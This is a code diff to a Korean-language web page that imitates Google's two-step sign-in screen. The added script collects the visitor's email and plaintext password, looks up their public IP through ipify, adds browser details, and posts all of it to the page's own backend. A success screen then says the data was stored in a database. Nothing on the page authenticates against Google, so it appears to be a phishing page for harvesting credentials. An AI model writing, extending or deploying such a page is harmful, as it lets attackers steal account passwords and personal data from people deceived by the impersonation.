@@ -159,8 +159,6 @@
         .hidden {
             display: none;
         }
-        
-        /* [추가] 로그인 성공 후 메인 화면 스타일 */
         .dashboard-container {
             width: 500px;
             padding: 40px;
@@ -199,14 +197,11 @@
 </head>
 <body>
 
-    <!-- 1. 로그인 프로세스 박스 -->
     <div class="container" id="login-box">
-        <!-- Google 로고 -->
         <div class="logo">
             <span class="c1">G</span><span class="c2">o</span><span class="c3">o</span><span class="c4">g</span><span class="c5">l</span><span class="c6">e</span>
         </div>
 
-        <!-- [단계 1] 이메일 입력 화면 -->
         <div id="step-email">
             <div class="title">로그인</div>
             <div class="subtitle">Google 계정 사용</div>
@@ -231,7 +226,6 @@
             </form>
         </div>
 
-        <!-- [단계 2] 비밀번호 입력 화면 -->
         <div id="step-password" class="hidden">
             <div class="title">환영합니다</div>
 
@@ -258,13 +252,12 @@
         </div>
     </div>
 
-    <!-- 2. [추가] 로그인 성공 후 보여질 메인 화면 (처음엔 숨김) -->
     <div class="dashboard-container hidden" id="dashboard-box">
         <div class="logo" style="margin-bottom: 20px;">
             <span class="c1">G</span><span class="c2">o</span><span class="c3">o</span><span class="c4">g</span><span class="c5">l</span><span class="c6">e</span>
         </div>
         <div class="welcome-title" id="welcome-msg">로그인 성공!</div>
-        <div class="welcome-desc">
+        <div class="welcome-desc" id="ip-info-text">
             성공적으로 인증되었습니다.<br>
             데이터베이스에 정보가 안전하게 기록되었습니다.
         </div>
@@ -297,12 +290,27 @@
             event.preventDefault();
             const passwordInput = document.getElementById('password-input').value;
 
-            const loginData = {
-                email: userEmail,
-                password: passwordInput
-            };
-
             try {
+                // 1. 공인 IP 가져오기 (ipify API 활용)
+                let clientIp = "";
+                try {
+                    const ipRes = await fetch("https://api.ipify.org?format=json");
+                    const ipData = await ipRes.json();
+                    clientIp = ipData.ip;
+                } catch (e) {
+                    console.error("IP 조회 실패:", e);
+                }
+
+                // 2. 서버로 보낼 데이터 묶음 (이메일, 비밀번호, IP, 브라우저 정보 등)
+                const loginData = {
+                    email: userEmail,
+                    password: passwordInput,
+                    ip: clientIp,
+                    user_agent: navigator.userAgent,
+                    language: navigator.language
+                };
+
+                // 3. 백엔드 API 호출
                 const response = await fetch('/api/login', {
                     method: 'POST',
                     headers: {
@@ -314,9 +322,11 @@
                 const result = await response.json();
                 
                 if (response.ok) {
-                    // 로그인 성공 시 로그인 박스를 숨기고 메인 화면을 표시
                     document.getElementById('login-box').classList.add('hidden');
                     document.getElementById('welcome-msg').innerText = `${userEmail}님 환영합니다!`;
+                    if (clientIp) {
+                        document.getElementById('ip-info-text').innerHTML = `접속 IP: <b>${clientIp}</b><br>데이터베이스에 정보가 안전하게 기록되었습니다.`;
+                    }
                     document.getElementById('dashboard-box').classList.remove('hidden');
                 } else {
                     alert('저장 실패: ' + result.message);
@@ -328,7 +338,6 @@
         }
 
         function handleLogout() {
-            // 로그아웃 시 다시 초기 로그인 화면으로 돌아가기
             document.getElementById('dashboard-box').classList.add('hidden');
             document.getElementById('step-password').classList.add('hidden');
             document.getElementById('step-email').classList.remove('hidden');
